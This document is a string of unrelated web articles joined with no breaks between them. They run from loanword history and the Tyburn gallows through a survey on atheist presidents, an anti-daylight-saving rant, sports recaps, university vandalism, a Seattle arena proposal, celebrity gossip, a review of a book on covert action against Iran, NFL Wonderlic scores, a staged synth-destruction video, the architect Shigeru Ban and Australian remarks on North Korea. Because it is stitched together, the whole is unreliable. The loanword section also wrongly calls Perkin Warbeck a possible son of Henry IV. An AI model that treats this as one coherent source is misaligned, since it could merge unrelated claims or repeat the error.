Certain loanwords have not survived or are rarely used. They appear in the dictionary, but seem lost in a mass of entries, isolated, ignored. Because they are exceptional, such terms tend to hint at a notable event or happening. One particular word tells a story of political intrigue. In its early days Tyburn was a country village in Middlesex, close to the current location of Marble Arch. Until 1783 it served as London's primary public place of execution. The first recorded hanging took place in 1196 and concerned the charismatic figure of William Fitz Osbert, known as ‘William Longbeard', the populist leader of London's poor who was apprehended after a mob uprising against the rich. It was one of the first explosions of urban violence in England. Early executions tended to be of a political nature. Order had to be protected at any cost, hence the public displays of punishment. Tensions within society grew with an increasing influx of refugees into London and elsewhere. It created anxiety among the authorities that certain aliens might have immigrated ‘under the colour of religion' and could be agents or spies. Such suspicions were not unjustified. Impostors had tried to claim the English throne on a couple of occasions. In both instances a foreign connection was evident. There was the failed attempt by Lambert Simnel, a young pretender to the throne of England and most likely of Flemish descent, whose supporters were beaten in the Battle of Stoke Field in June 1487. Simnel was imprisoned for life, but Henry VII pardoned the young man and gave him a job in the Royal kitchens.
Tournai-born Perkin Warbeck was possibly an illegitimate son of Henry IV. He called himself Richard Shrewsbury, Duke of York. Various European monarchs accepted Warbeck's claim to the English throne in order to pursue their own diplomatic objectives. In 1497 he landed in Cornwall with a small army of men hoping to capitalize on local resentment in the aftermath of a recent rebellion against the war taxes imposed by Henry VII for his Scottish campaign. As the rebels had been heavily defeated, Perkin found little support for a renewed uprising. He was captured and hanged as a traitor at Tyburn. The story of events was dramatized in 1634 by John Ford in a play entitled The Chronicle Historie of Perkin Warbeck: a Tragedy. In 1830, Mary Shelley wrote a story about him. A linguistic link to the impostor remains. ‘Landloper' is a Dutch/Flemish word for vagabond or vagrant. The word was first recorded in Britain in the early sixteenth century and used by Francis Bacon in Henry VII (1622) when referring to Warbeck: ‘He had been from his Child-hood such a Wanderer, or (as the King called him) such a Land-loper'. It may well be that Perkin had brought the word with him when he crossed from Flanders to England.
The integration of loanwords can be controversial. In the circle of linguistic sticklers such terms are frowned upon. They suffer hostility and discrimination. Purism is the practice of defining one variety of language as being of intrinsically higher quality than others. By definition, the purist is a prophet of doom. An invasion of foreign words is a sign of decline, fatal to a nation's cultural wellbeing. He/she strives for a form of prescriptive linguistics, aiming to establish a standard language that is resistant to change, and immune to foreign importation. Purists are the border agents of language, overseeing the strict control of the movement of words. Their record is just as poor as that of the UK Border Agency itself. They have failed in the past and will continue to do so. Nations and languages do not live in a vacuum, but they flourish in a continuous interactive relationship with other countries and peoples. Freedom of movement and exchange are the essential characteristics of a dynamic culture. Mapping the spread of loanwords offers an insight into the balance of power between nations and the migration of peoples at any given period in time.
The Public Religion Research Institute just released the 2011 American Values Survey — “a large annual survey exploring important issues at the intersection of religion, values and politics.”
The headlines are focusing on how only 42% of Americans know Mitt Romney is a Mormon and how most Americans want to see a redistribution of wealth, but I'm most interested in the questions that involve people without faith…
Only one piece of information stands out and it's in response to the following question: Would you be very comfortable, somewhat comfortable, somewhat uncomfortable, or very uncomfortable with [an atheist] serving as president?
Check out the left side of this chart for the response:
67% of all voters would feel somewhat or very uncomfortable with an atheist president.
80% of all Republicans, 70% of Democrats, and 56% of all Independents feel the same.
So Democrats would be more uncomfortable with an atheist president than a Muslim president.
Republicans — not surprisingly, a higher proportion of them than Democrats — would be equally uncomfortable with both an atheist president and a Muslim president.
Overall, though, a non-theistic presidential candidate has a bigger hurdle to overcome than a person of any faith at all. It's unbelievable that in this day and age, America still has this much of a hangup over a leader who would put more weight in evidence and logical thinking than in an imaginary god and ancient books.
(And how the hell are people more comfortable with Mormons than with us?! Their story is even crazier than that of evangelical Christianity!)
When the numbers were broken down fully (PDF), only 31% of those surveyed were very comfortable or somewhat comfortable with an atheist president (compared to 33% for a Muslim president).
While our numbers seem to be growing in every other conceivable way, we're not making a lot of progress when it comes to how religious Americans perceive us. They still fear those of us who don't believe in a god.
The best way to fix that, of course, is for more of us to come out publicly as atheists. When people know that someone close to them doesn't believe in god — and is still a good friend, an honest person, a decent human being — it makes it that much harder to think badly of atheists right off the bat.
Ugh. You're up an hour early, your body hates you for it, and even a gallon of coffee can't get your day on track. Daylight saving sucks. But you know the worst part? It doesn't have to be like this.

Daylight saving isn't as old as you think it is. First suggested by Benjamin Franklin, in 1784, it was at the time shot down by many very sensible people as being pointless. Then, in the First World War, it was introduced—first by the Germans—to save coal during war time.

Somehow in that age of austerity, the concept soon caught on and everyone started doing it. Sadly, nobody's really thought to change back. Except Arizona, and it hasn't fallen off the face of the planet as a result.
But oddly, some people still support the use of daylight saving: they say it saves energy, promotes a healthy lifestyle, and reduces traffic accidents. So let's bust the myths right now and make it clear that daylight saving needs to go.
Daylight Saving doesn't save energy...
The Germans introduced daylight saving to lower fuel costs. The idea is that, while changing the clocks reduces the use of artificial lighting in the evening but increases use in the morning, the evening reduction outweighs the morning increase.

Great—but that was a century ago. Recent studies point out that, at best, DST might reduce the US electricity usage by 1% during March and April. Other estimates, by the National Bureau of Standards, suggest it has zero effect.
...cut accidents...
Many folks point to the fact that DST reduces the incidence of road traffic accidents as a good reason to keep using the system. In fact, the data surrounding road safety disagree widely. Some studies show that it makes no difference, others suggest a 0.7 per cent reduction in traffic fatalities during DST. When the data's that limited, it's not enough to base a decision on.

...or make us any healthier...
It's true that DST does provide extra daylight in the evening, and that it may bring with it increased physical activity and reduced incidence of depression. But there is plenty of evidence that changing the clocks by an hour can have a detrimental effect on our health.
Clock shifts disrupt our circadian rhythms. Studies have show that, around the times of the spring clock changes, there are spikes in suicide rates and an increase in the number of recorded heart attacks. In fact, when Kazakhstan ditched DST in 2005, it cited health reasons. Sure, it might make you go for an extra jog or two every year, but it might also help contribute to a heart attack. I know which I'd prefer.

...but is incredibly disruptive.
So, none of the arguments for maintaining DST weigh up. I have one, very large, argument to support scrapping it, though: it loses the US billions of dollars every year. It damages retail, affects the stock market in a negative way, and even disrupts agriculture.
A century ago, we didn't have data to tell us whether DST made a real measurable impact; it was acceptable to run with it because, for all we knew, it was useful. Now, we know better. Daylight savings sucks—and we need to get rid of it.

MINNEAPOLIS (GopherSports.com) - The Gopher Hockey program rallied with three goals in the third period for a 3-1 win against Michigan State on Saturday as Minnesota swept the Spartans and climbed above .500 for the first time this season.
Justin Kloos and Tyler Sheehy factored into all three goals for Minnesota (11-10-0 overall, 6-2-0-0 Big Ten) while Connor Reilly notched the game-winning goal and had an assist. Leon Bristedt scored an empty-net goal with less than a second to play to seal the victory and the series sweep for the Maroon & Gold.
Following a scoreless first period, Michigan State's Matt DeBlouw scored 2:53 into the second period for the only goal of the night for Michigan State (5-17-0, 1-7-0-0).
After that, it was all Gophers.
Kloos, who scored 21 seconds into Friday's 5-2 win over the Spartans, kicked things off with a goal 31 seconds into the third period on Saturday night for his seventh of the year (assists from Sheehy and Reilly) before Reilly followed suit with his second of the year midway through the stanza at 11:34 (assists from Kloos and Sheehy).
When Michigan State pulled Jake Hildebrand in favor of the extra attacker, Bristedt pocketed his 11th goal of the year into the empty net at 19:59 as the puck cleared the goal line with 0.1 seconds left on the clock. Sheehy and Kloos earned assists on the goal as Minnesota picked up its third-straight win. Sheehy's three-assist night set a new career high for the freshman forward and matched his career high for points.
Eric Schierhorn made 17 saves in goal for the Maroon & Gold in his 21st-straight start. The rookie now boasts an 11-10-0 record on the year.
Minnesota only had to kill one penalty on the night, but the team did so successfully - extending its streak to 16-straight penalty kills without allowing a goal.
The Gophers are now 21-1-2-0 all-time in Big Ten games on home ice.
The Gophers return to action next weekend with a Big Ten road series, opening up the Border Battle with Wisconsin in Madison.

Student leaders at the University of Michigan said that the self-governing Greek Council was effectively working toward sanctions for the fraternities and sororities involved in the vandalism of two northern Michigan ski resorts in January, but also called for Michigan State Police, national Greek organizations, and the university leadership to take their own actions against the groups and individuals involved.
Alexander Krupiak, the president of U-M's Interfraternal Council, said the events that took place at Treetops and Boyne resorts during the weekend of Jan. 16-18 were inexcusable and shed an extremely negative light on the university.

He and Madeline Walsh, the president of the PanHellenic Association, each offered apologies to the Board of Regents Thursday evening during the regents' meeting, and also offered apologies to the entire U-M community.
"We have been collectively embarrassed and humbled by the actions of some of our members," Krupiak said.
"We fully understand how our actions impacted everyone involved, with the level of media attention that events received, and understand that severe actions need to be taken in order to improve our community. We plan to move forward in a positive direction. .... I hope that the Michigan State Police, the university and the national organization of all the six chapters will hold all individuals accountable for their actions."
During the weekend, more than 200 members of Sigma Alpha Mu and Sigma Delta Tau booked about 40 rooms at Treetops Resorts in Gaylord and caused damages in excess of $100,000, including broken doors and furniture, holes in drywall, broken fixtures and soiled carpet.
Pi Kappa Alpha, Chi Psi, Delta Gamma and Alpha Phi rented 12 condo units at Boyne Highlands ski resort in Harbor Springs and caused more than $25,000 in damages to the units. Officials at the resort said the damage was similar to what the groups cause at Treetops.
Walsh said that each of the six organizations involved were sanctioned individually through the Greek Activity Review Panel while further sanctions were being considered by the dean of students, and all organizations were also punished to some extent by their national organizations.
The Greek Activity Review Panel board was made up of five justices from all four of the Greek councils.
"We worked in collaboration with the Center for Campus Involvement through the Student Organizations Accountability Review process. The justices have decided sanctions for each of the six organizations, and they are currently in the process of being approved by the dean of students," Walsh said.
"While I cannot speak to the exact sanctions, I would expect that punitive measures would be the most effective if paired with restorative and educational measures as well."
The dean of students Laura Blake Jones was involved in a closed-door meeting with university officials last week inside the Michigan Union examining the proposed sanctions and discussing other possible penalties for the organizations involved.
Beyond the six Greek organizations involved, Walsh said, leaders across the Greek community have come together to discuss how the the community can move forward.
"That being said, the student judicial process is only one element of self-governance. We recognize the importance of working collaborative with partners across campus and of the broader community. I would like to reassure you that students are taking this seriously, reflecting on their actions and looking towards a positive future," she said.
U-M spokesman Rick Fitzgerald said that the university could take actions as severe as suspending the Greek organizations, but issuing sanctions against individuals right now would be hard since they don't know which individuals were responsible for the actions. He said the judicial process and the university and the legal process with the MSP are ongoing.
"In the Greek community, we believe in restorative, not only punitive punishments. However, in this instance, punitive measures are also called for and have been included in these proceedings," Krupiak said.
"The only way to move forward completely from this is to make sure every member understands the consequences of his or her behavior. We also recognize that regardless of if an individual caused damage or not, each member had a responsibility to be an active bystander and failure to do so caused major ramifications for their organizations and the university as a whole.
"For the future betterment of the community, and hopefully for the betterment of the university as well, we pledge to help these chapters to continue to move forward in a positive direction. We will be working with each chapter very closely to make sure that they follow through with the sanctions, as well as make sure that the culture or each group is continuing to improve."
U-M Regent Denise Illitch was forgiving of the fraternities and sororities.
"I just want to thank you for coming forward. I accept your apology on behalf of the entire Greek community, of which I am a member and a University of Michigan alumni of the Greek community," she said.
Illitch asked Krupiak what the Greek community planned on doing to ensure something like this doesn't happen in the future.
"I think any sort of measure suggested in these hearings were a lot of educational measures, as well as just the whole community seeing these reports and realizing the ramifications," he said.
"I think one of the craziest things for myself and many of the members is how one member of one organization not only affects their chapter and the Greek community, but as a whole the University of Michigan and all of its alumni and every student here. So I think the realization of that, along with a lot of different educational measures across the spectrum will help immensely."
He said the parties fully plan on paying for all damages, but the cases hadn't been closed in the judicial process, so he couldn't speak in-depth about everything.
"I can assure you that all six chapters will be paying in full. The hearings have not been completed yet. Once the hearings have been completed, the sanctions will be placed upon all six chapters. The suggestions in the hearing were pretty severe and we hope we'll move into a positive direction with educational measures and suspensions as well."
Earlier in the meeting, U-M President Mark Schlissel said that the destruction and the vandalism that took place do not reflect the values of the university. He added that these actions were also not representative of the entirety of the student body or of the broad majority of students who participate in Greek life.
"The process is ongoing, but we intend to hold those who are responsible accountable for their actions," Schlissel said.
Walsh echoed Krupiak's apologies as well as Schlissel's statements. She said the actions from that weekend were not congruent with the values of the Greek community, and that they have taken steps to ensure the behaviors displayed are addressed.
"Beyond negative attention, the events of the weekend caused significant damage to the resorts and greater communities in northern Michigan," she said.
"I regret that members of the PanHellenic community have brought such vast media to the university and damaged the reputation we all strive to uphold as the leaders and best."

More than five years ago, our Seattle-based partnership began the long and thorough process of developing the SODO Arena. Our sole focus is to bring the NBA and NHL back to Seattle. We believe our proposal to build a privately funded, state-of-the-art Arena at the southern end of Seattle's zoned Stadium District, directly south of the two existing sports venues, is the City's best chance to achieve those goals.
Since we began the process in 2011, we have invested more than $100 million to acquire the land in the Stadium District, paid for a lengthy environmental review as well as traffic, parking and economic impact studies. All those studies, as well as the Final Environmental Impact Statement, concluded that the SODO Arena presented no significant unavoidable impacts to the street system, public transportation or freight movement.
Before choosing the Stadium District site, we took a long and careful look at KeyArena. That review led us to the conclusion that the traffic, parking and other issues at that location and the surrounding dense Uptown Neighborhood, posed significant obstacles to developing a fan-friendly, major league sports venue. I have had a lot of personal history with Key Arena and with its predecessor, the Seattle Center Coliseum. Going back to the Pleistocene era when I played…the Sonics competed for the NBA Championship at that site and again in 1996.
We would like nothing better than a solution that enables Seattle fans to again share that experience. If KeyArena were the optimal site for attracting professional teams here, we would wholeheartedly support it. But, we worry that the site and structure of a deal with a third-party operator, will make it more challenging.
Unlike the KeyArena site, the Stadium District enjoys an existing and robust transportation network that is well suited to handle large-scale events. This transportation network includes local and regional connections to ferries, buses, light rail, heavy rail and freeways, all within an easy walk to the Arena. Our project also includes ample parking options within the Arena vicinity.
The freight mobility concerns raised by the Port of Seattle are misplaced. Almost all the events at the SODO Arena would take place at night, well after Port operations have closed. NBA fans in general, show up at their arena, very close to game time. There is no tailgating in January in Seattle and the Arena doors would not even open until 90 minutes before the tip.
Also, according to the city's recently adopted Freight Transportation Plan and the Final EIS, that one-block segment of Occidental is not vital to the SODO freight transportation network. Additionally, the Lander Street Overpass project will dead end Occidental just south of the proposed Arena, making that stretch of Occidental even less useful to the SODO transportation network.
It's important to understand that if the Council rejects the street vacation, it is likely that the site will be commercially developed, allowable under current zoning. That alternative would generate significant peak-period traffic that would be in direct conflict with the freight community.
We recently submitted a new petition to vacate the one-block segment of Occidental Avenue South needed to construct the Arena. If granted by the City Council, we will purchase that approximate 40,000 square feet of land at an appraised market rate value, with those funds going toward additional transportation improvements in the SODO neighborhood.
It should also be noted that, unlike a KeyArena redevelopment, the SODO Arena would generate significant property tax revenue for the City, County, Port and State. In fact, a rough estimate of the property tax paid annually to the city of Seattle alone should exceed $1,000,000, per year. Local and state schools should get well north of $3,000,000 per year from the outset, just from the property tax alone, on the SODO Arena. Over the expected thirty-year plus life of the Arena, our schools should receive an incremental $100,000,000 from this privately owned and financed building. This doesn't even begin to factor the large amount of sales tax generated, which benefits the City, County and State, particularly if we can attract both the NBA and NHL.
The benefit package we have offered as a part of the vacation petition includes a large, public open-space site comparable in size to Westlake and Occidental Parks, an on-site ecological treatment facility that will biologically treat wastewater for reuse in the Arena, a generous public art program and significant transportation improvements that will benefit the freight community, bikes and pedestrians. The Arena will also include an 800-foot-long pedestrian and bike bridge to improve traffic flow and safety over the active rail corridor. The benefit package totals almost $27 million, not including the cost of the mitigation that will be required by the Master Use Permit approval or the cost of purchasing the section of Occidental.
The significant investment in the Arena and related projects we have offered, reflects our local investment group's strong commitment to our City and region. We look forward to working with the City Council as they once again take up the proposed street vacation. Approving the conditional street vacation makes the SODO Arena shovel-ready and sends a strong message to the NBA and NHL that Seattle is ready and eager for teams.

The question left Kobe Bryant equally bewildered and amused.
Did the Lakers' star ever envision Memphis center Marc Gasol morphing into the player he has become? The one who causes those inside and outside of the Grizzlies to rank him as the NBA's best center? The one who enters the Lakers' game against the Memphis Grizzlies (23-8) on Friday at Staples Center averaging a career-high 20.1 points along with 8.3. rebounds and 1.6 blocks? The one who has anchored a top-ranked Memphis defense that earned him the NBA's 2012-13 defensive player of the year award?
“Nope,” Bryant said, laughing.
Bryant provided an understandable explanation for lacking clairvoyance. Marc Gasol represented one of many pieces the Lakers (10-22) traded about seven years ago to the Grizzlies to secure his brother, Pau. That move required the Lakers to trade Kwame Brown, Aaron McKie, Javaris Crittenton and two first-round picks without any hesitation. As for Marc Gasol, the Lakers fretted little about granting Memphis his rights after selecting him 48th overall in the 2007 NBA draft.
“He was a heavyset kid,” Bryant told the Los Angeles News Group about Marc Gasol, who entered the NBA listed at 280 pounds. “He was a mystery to everybody. Who knew?”
The Lakers hardly have any regrets over the move they made, for obvious reasons.
“We won a couple more championships,” said Lakers coach Byron Scott, referring to the team's back-to-back title runs in 2009 and 2010 shortly after Pau Gasol's arrival. “You can't get too mad about it.”
But it seems safe to say the Lakers would like Marc Gasol back once he becomes an unrestricted free agent in July. With Bryant, Nick Young, Julius Randle and Ryan Kelly as the lone players under contract for the 2015-16 season, the Lakers will have enough cap space to sign one player to a max-level contract.
Bryant smiled when offering a “no comment” on whether he will recruit Marc Gasol to join the Lakers. Or if Bryant would ask Pau Gasol to intervene as a third party.
Pau provided Marc a neutral perspective despite the affection he still holds for the Lakers after leaving this offseason to sign with the Chicago Bulls.
“I have shared with him that he needs to play as hard as he can,” Pau told Los Angeles News Group. “He needs to play as good as he can and take his team as far as he can. Then he can think about his future afterwards. He can put everything aside and then he can evaluate everything on if he wants to stay in Memphis. That seems like a pretty reasonable option.
“Or he can give it a shot to another place. We'll see. But who knows. That's later. Right now, it's a distraction.”
Marc Gasol was not available for comment amid Memphis' recent travel schedule and an unspecified illness that kept him out of Wednesday's practice. But Memphis coach Dave Joerger outlined plenty of qualities earlier this season that makes him attractive to any team.
“He gets a lot of praise for being such an intellectual guy. That overshadows the fact that he's extremely talented,” Joerger said. “His ball skills and hand-eye coordination is tremendous. His footwork is outstanding. His IQ and want to on the defensive end of the floor is amazing. He wants to win.”
Seven years later, Marc Gasol has changed his identity since the Lakers traded him as an unknown commodity riddled with questions marks. He has anchored a Grizzlies defense than ranks second overall in total points allowed (97.2 per game). The Grizzlies list him at 265 pounds after he spent an offseason on an unspecified diet to lose weight. Joerger attributes Marc Gasol's increased assertiveness, mixed with his versatility in scoring and passing, for his career numbers.
All of which prompted Scott to say, “He's the best center, I think, in basketball right now. To me, it's not close.”
But should Lakers fans even get their hopes up? The Grizzlies own the Western Conference's third-best record. They have played in the postseason in the past four years, backed by a core that includes Zach Randolph and Mike Conley. The Grizzlies could offer Marc Gasol a five-year deal worth around $108 million, as opposed to a four-year deal worth $87 million with any other team. Meanwhile, the Lakers are on pace to finish with their worst record in L.A. franchise history.
“I don't see Marc leaving Memphis,” said Lakers forward Ed Davis, who played for the Grizzlies from 2012 to 2014. “He's already got so much established there. So I don't see why that would change.”
But …
“You never know,” Davis said. “Things can change in an instant like that, with something unexpected.”
Marc Gasol's ascension in the NBA seemed unexpected, prompting Bryant to analyze him in a way that starkly differed from his first impression.
“He just got better,” said Bryant, who praised Marc Gasol's passing and post presence. “He's so athletic and light on his feet.”
In case you don't trust your own eyes or sense of logic, the Jackson family has basically confirmed that at least one of Michael Jackson's children did not spring from his seed. According to a TMZ report:
Michael Jackson's family is pleading with the judge in their wrongful death lawsuit against AEG Live to EXCLUDE any evidence of the paternity of MJ's 3 kids. TMZ has obtained legal docs in which Katherine Jackson, Blanket, Paris and Prince argue ... it's irrelevant for a jury to hear evidence about the conception of the 3 kids. Specifically, they believe AEG has no right to delve into their biological parentage.
Ostensibly, it makes sense that this information is irrelevant to the wrongful death suit, but it is entirely relevant to inquiring minds.
We know that Debbie Rowe, MJ's one-time wife gave birth to Prince and Paris (or do we?), and that an as-yet-unidentified woman gave birth to Blanket (or do we?). Jackson denounced reports that Prince was conceived via artificial insemination, but claimed that Blanket was. Then again, he's a Jackson, so who knows what to believe. For all we know, Prince, Paris and Blanket are all the real-life realization of A.I.-style androids sculpted from the Elephant Man's bones by Bubbles the Chimp.
Just kidding, they're just kids. It's fun to think of who their dad might be, though. My guesses are Tom Cruise and Elizabeth Taylor. Blanket might actually be MJ's, though — he has the same pre-surgical eyes and the have-you-seen-my-childhood deadness in them.
Michael Jackson's three kids are pictured above standing with the person who has become the most relevant Jackson in current pop culture, La Toya. She hasn't left the TV airwaves since MJ died and will have her on reality show on OWN starting next month. She is also not his child. Or is she?

WASHINGTON  Israel and America are intensifying a clandestine war against Iran that has run hot and cold since the Islamic Revolution in 1979 but has grown more urgent as Iran races to obtain an atomic bomb.
That is a central claim in a new book, "The Secret War with Iran," by an Israeli journalist, Ronen Bergman, who also details a series of mishaps during the past 2 1/2 years that have likely delayed Iran's efforts to go nuclear.
While President Bush and other Western leaders have warned of the seriousness of the threat that Iran may obtain a nuclear weapon, little reporting has surfaced in the West on the efforts in the shadows to stop the Iranians. Mr. Bergman himself has had to skate a close line in this area, in part because of military censorship in Israel, where some of his reporting has been withheld from publication pending rulings from the Israeli Supreme Court.
Nonetheless, the Israeli journalist compiles a picture that suggests that the West has had some successes in the war to stop the Iranian bomb. Mr. Bergman reports, for example, that in January 2007 Iran determined that some of its nuclear suppliers in Europe were fronts for Western intelligence services, specifically Britain's MI6.
And Mr. Bergman writes that between February 2006 and March 2007, at least three planes "belonging to the Revolutionary Guards crashed in Iran, while carrying personnel connected with the security of the nuclear project." Specialized pipes for centrifuges sold to Iran have been modified, he writes, and specialized computers sold to Iran for its nuclear laboratories contained viruses that sabotaged the code.
The secret efforts appear not to be limited to modifying equipment: On January 18, 2007, an Iranian expert on electromagnetics who worked in an Isfahan enrichment facility, Ardeshir Hosseinpour, died in his apartment, Mr. Bergman writes.
The author quotes the deputy director of the Israeli Atomic Energy Commission, Eli Levite, as saying in a closed forum that operations against Iran "gained time for us" and have "doubtless caused significant delays in the project. The process has led to the revealing of large parts of the program in the areas of sources of supply, of the infrastructure, and of the goals, which were not known or were known at a different resolution."
While Israel's Mossad and military intelligence have targeted Iranian terrorists almost since the 1979 revolution, the Jewish state was relatively slow to pick up on the full extent of Iran's nuclear program. Mr. Bergman reports that Israel first learned of the nuclear facility in Natanz in 1996, a full six years before the facility was first disclosed to the public, but several years after the Iranians began their initial work there. Two Israeli operatives, posing as tourists, arrived at the site and took soil samples, which they brought back to Israel in their shoes and which showed some radiation.
Mr. Bergman also details a success for the CIA in the shadow war against Iran, when General Ali Reza Askari defected to the American side in February 2007. Mr. Bergman reports that General Askari was closer to the reformist President Khatami and felt threatened by his old rival in intelligence when President Ahmadinejad came to power in 2005.
General Askari, for example, warned Mr. Khatami after the attacks of September 11, 2001, that Iran's Revolutionary Guards had given shelter to key Al Qaeda operatives fleeing American troops in Afghanistan. He said in his debriefings, according to Mr. Bergman, that Iran had entered into joint nuclear projects with both Syria and North Korea.
The defector also claimed that Iran erected a secret enrichment facility near the known centrifuge area in Natanz.
Mr. Bergman finally comes close to saying outright that Israel was responsible for the assassination in February of a master Hezbollah terrorist, Imad Mugniyah. He writes: "Although Israel has denied responsibility for the assassination, the Mugniyah hit was exactly the kind of thing needed to restore the country's faith in, and more importantly the enemy's fear of, Israel's intelligence services."
Mr. Bergman then quotes an Israeli intelligence official, who recalls the exact model of the vehicle Mugniyah was driving when he was attacked. "Pity about that new Pijero," he said.
Morris Claiborne
The lowest score recorded on the Wonderlic might surprise you. Morris Claiborne, the All-American from Louisiana State University, scored a four out of fifty on the Wonderlic Cognitive Ability Test.
Many NFL scouts considered Claiborne to be the most talented defender in the 2012 NFL draft. Claiborne was ultimately picked up by the Dallas Cowboys in the 2012 NFL Draft and has since gone on to be one of the league's dominant cornerbacks.
Morris Claiborne's score of four out of fifty on the Wonderlic proved significantly lower than the NFL average for cornerbacks on the Wonderlic (18). That said, Clairborne's low score may have alarmed some scouts, yet Claiborne's score didn't ultimately hamper his defensive performance on the gridiron.
In fact, Claiborne said that he blew the test off because he didn't feel like the test gauged skills relevant to football or playing in the NFL. Claiborne might have a point, but his Wonderlic score remains the lowest and probably most embarrassing score in NFL history.

Cordarrelle Patterson
A first-round selection in the 2013 NFL draft, Cordarrelle Patterson posted an 11 out of 50 on the Wonderlic. Although Patterson is known by his teammates as “The Flash” and has the longest kick return in NFL history at 109 yards, there was nothing flashy or impressive about his significantly below average Wonderlic score.
Combine scouts were concerned from the outset with Patterson's poor performance on the Wonderlic. Many thought that Patterson didn't have the mental horsepower to remember plays or make snap decisions on the field.
A scout from the Tennessee Titans at the time said that IQ was a significant part of being a wide receiver in the NFL, and that Patterson might ultimately fail to learn the playbook of any team that recruited him.
Other scouts look for scores in the high 20s or low 30s from wide receivers, so Cordarrelle Patterson's Wonderlic performance was a significant disappointment.

Jeff George
Jeff George was the first overall pick in the 1990 NFL Draft. George's Wonderlic score of 10 proved to be a controversial factor in the Indianapolis Colt's deciding to pick up the young University of Illinois quarterback.
Even more surprising, the Colts gave George a six-year contract and made Jeff George the highest-paid rookie recruit up to that point in NFL history. The Colts must have seen something in the young rookie because the Wonderlic cutoff for literacy is 10 out of 50, George's score.
Some players and scouts still question the validity and relevance of the Wonderlic as it relates to the realities of the NFL. After all, Dan Marino scored a 15 out of 50 on the Wonderlic and, by all accounts, did pretty well for himself.
I'm going to keep this short, because as you may have guessed by the title of this story things may not have panned out quite the way we expected. A few days back Image Line (the makers of FL Studio) announced they had sampled an original Roland TB-303 and would now destroy it. They took requests. We felt destroying a piece of music history wasn't the best way to deal with a classic synth and posted about it here.
So, a few days have passed. The reactions were strong back then, how are you feeling now? And most importantly what really happened to the TB-303?
Here's the video showing what Image Line did to the vintage music machine... even if you're squeamish about things being harmed (like me) it's worth perservering and watching this short video to the end...
Spoiler alert: Don't read this if you want the full impact of the video... but basically, the real Roland TB-303 was not harmed at all during the making of the video above.
Here's what our friends at Image Line tell us about the video and about your chance to win a genuine Roland TB-303 if you buy Transistor Bass:
"We made the video and it's even hard for us to watch it! Here's what we did: We took a Cyclone TT-303 and removed the internals, inserted a fake 3D-Printed circuit board and knob (notice one gets hit with the saw look carefully at the last moment and you will see the change). We then filmed the genuine Roland TB-303 on the saw and swapped it out at the last moment for the Cyclone TT-303 (the case with fake internals). That's why there's duct-taped end-stops on the saw, so we could position both units exactly. As the genuine TB-303 and clone TT-303 cases are identical, it was easy to composite the two videos in post. If you pay careful attention to the guard on the saw, you can see small errors in the video mask. Yes we did cut up the TT-303 case, but its now reassembled, working and nicely 'modded'. Of course, no genuine TB-303 was harmed in the making of this video. However, we still see some people on social media claiming we faked the fake and destroyed both! What you gonna do? But! If you believe both still exist, read on."
Now it's your chance to win a slice of Synth history!

Last night, Shigeru Ban became the 37th winner of the "Nobel for architecture," also known as the Pritzker Prize. Ban is the most exciting winner in recent memory—here's why.

The 56-year-old architect is far from a star. Rather, he seems like a fairly normal guy, apart from his unique ideas about architecture. Michael Kimmelman calls his work "anti-architecture," with Ban as an admirable anti-hero. "Young architects seem more and more interested in what I'm doing," Ban tells Kimmelman. "Everyone used to want to be star architects. That's no longer the case."
Instead, Ban has built a portfolio of homes, museums and institutional buildings, all the while developing a technical framework for building with paper—which he uses to create super-strong cardboard structural members—and a passion for bringing shelter to disaster areas. Over the past two decades, he's traveled to war zones and crisis areas from Rwanda to Kobe to build cardboard shelters that can be put up in a matter of hours and taken down and recycled just as quickly.
Check out a few of Ban's projects, below.
The Paper House, Yamanashi, Japan, 1995
The Paper House was Ban's first building made primarily from paper. The home required special permission, since paper isn't a recognized building material. Ten paper tubes support the vertical load and the eighty interior tubes bear the lateral forces.

Rwanda Refugee Shelters, 1994
The year before, Ban had gone to Rwanda to build refugee shelters using his new technique. It was the first of many projects for the homeless and displaced.

Paper Church in Kobe, 1995
After the Kobe Earthquake, which killed 6,434 people in 1995, Ban built paper shelters, which cost less than $2,000 and could be recycled after use. He also built a temporary church—which, today, is still in use.

Paper Partition System 4, 2011, Japan
In 2011, after the earthquake and tsunami, Ban suspended much of his normal work to focus completely on providing shelter for the thousands of homeless refugees from the eastern coast. This partition system was designed to give families a modicum of privacy while sheltered in a school gym.

Then came the long process of finding housing for the displaced. In response to the severe housing shortage, Ban's team designed a huge, three-story complex of stacked shipping containers—focused around a wood-and-plastic community center built with paper tube columns.

Hualin Temporary Elementary School, 2008
After the Sichuan earthquake, in 2008, Ban stepped in to build an elementary school. The paper columns held up clear panels of polycarbonate, which let light into the space. Three buildings were finished in about forty days—they were the first buildings to be rebuilt in the area.

Paper Emergency Shelter for Haiti, Port-au-Prince, Haiti, 2010
Another earthquake—Haiti's horrific 7.0 magnitude quake in 2010—brought Ban to Port-au-Prince. Working with students from the Dominican Republic, he and his team built 50 shelters made from his signature wooden tubes.

Centre Pompidou-Metz, France, 2010
Not all of Ban's buildings are disaster-related. In fact, he has a long list of museums and institutions, too—like this annex to the Pompidou Center. The building's curving roofline is made from laminated wood, while more tubes serve to support a cantilever on the interior.

Cardboard Cathedral, Christchurch, New Zealand, 2013
Ban's Christchurch Cathedral is the perfect mixture of both aspects of his work: Built as a temporary church in the wake of New Zealand's catastrophic 2011 quake, the church is designed to last for 50 years. That will give the community enough time to build a permanent church—at which point Ban's massive cardboard tubes will be dismantled and recycled. Unless, of course, the town has grown too attached to them, which seems likely.

Australian PM Malcolm Turnbull has said his nation is prepared to join a conflict against North Korea if the United States comes under attack.
Pyongyang said on Wednesday it had a plan to fire four missiles near the US territory of Guam.
US President Donald Trump warned North Korea it should be "very, very nervous" if it does anything to the US.
Mr Turnbull said Australia would fulfil its obligations under the Anzus Treaty if an attack on the US took place.
"America stands by its allies, including Australia of course, and we stand by the United States," Mr Turnbull told local radio 3AW on Friday.
"So be very, very clear on that. If there is an attack on the US, the Anzus Treaty would be invoked and Australia would come to the aid of the United States, as America would come to our aid if we were attacked."
What is the Anzus Treaty?
It is a security agreement signed by Australia, New Zealand and the US in 1951.
The treaty is designed to act as a deterrent against aggression from other nations.
Under the agreement, signatories are compelled to "consult" and "act to meet the common danger" if one is attacked.
However, experts have said its precise application could be open to interpretation.
Australia has invoked the treaty just once, in 2001, when it joined US troops in Afghanistan after the 9/11 attacks.
The US and New Zealand suspended obligations to each other in the 1980s.
Tensions between North Korea and the US have escalated in recent weeks after North Korea tested two intercontinental ballistic missiles in July.
Mr Turnbull described the US alliance as "the absolute bedrock of our national security".
"Now, how that manifests itself obviously will depend on the circumstances and the consultations with our allies," he said.
